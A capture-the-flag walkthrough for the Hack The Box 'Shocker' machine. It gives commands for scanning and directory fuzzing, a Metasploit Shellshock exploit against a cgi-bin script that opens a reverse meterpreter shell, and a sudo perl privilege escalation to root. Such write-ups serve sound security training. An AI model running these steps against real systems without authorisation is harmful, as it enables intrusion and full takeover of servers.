---
description: Walkthrough (Easy)
---

# Shocker 🟢🟢🟢

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Shocker, while fairly simple overall, demonstrates the severity of the renowned Shellshock exploit, which affected millions of public-facing servers.

[https://app.hackthebox.com/machines/Shocker](https://app.hackthebox.com/machines/Shocker)&#x20;

### Reconnaissance

```bash
nmap -T4 -sVC 10.10.10.56 -oN Nmap
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* Found http and ssh in 2222 port open.
* Lets try 1st for Directory busting.

### Directory Fuzzing

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/wordlists/SecLists/Discovery/Web-Content/common.txt
```
{% endcode %}

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 299]
Progress: 4727 / 4727 (100.00%)
===============================================================
Finished
===============================================================
```

* Found intresting directory cgi-bin and searched about it in google about cgi-bin exploit

### Shellshock Remote Command Injection

Shellshock is a critical bug in Bash versions 1.0.3 - 4.3 that can enable an attacker to execute arbitrary commands.

Vulnerable versions of Bash incorrectly execute commands that follow function definitions stored inside environment variables - this can be exploited by an attacker in systems that store user input in environment variables.

* Got to know that cgi-bin runs many bash scripts on web servers.&#x20;
* By using that scripts we can get a Reverse shell, so lets find find that bash script in cgi-bin

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .sh
```
{% endcode %}

```bash
/user.sh              (Status: 200) [Size: 118]
```

* Found user.sh script (cat)

```bash
Content-Type: text/plain

Just an uptime test script

 06:22:41 up  1:32,  0 users,  load average: 0.20, 0.06, 0.02
```

* This script is cheking the uptime of a linux machine.

### Metasploit

```bash
msfconsole
> search shellshock
> use multi/http/apache_mod_cgi_bash_env_exec
> set rhosts 10.10.10.56
> set lhost tun0
> set targeturi /cgi-bin/user.sh
> run
```

* Got a meterpreter Shell upgrade shell by typing `shell`
* `python3 -c 'import pty; pty.spawn("/bin/bash")'`    get fully tty shell
* You will find `user.txt` in `/home/shelly/user.txt`

### Previlage Esculation getting Root

`sudo -l`

```bash
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Found that user can run perl command without root password as a sudo user.

* Get to `gtfobins` and Found sudo for perl [here](https://gtfobins.github.io/gtfobins/perl/)

```bash
sudo perl -e 'exec "/bin/sh";'
```

* after running this command you get a root shell :)

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
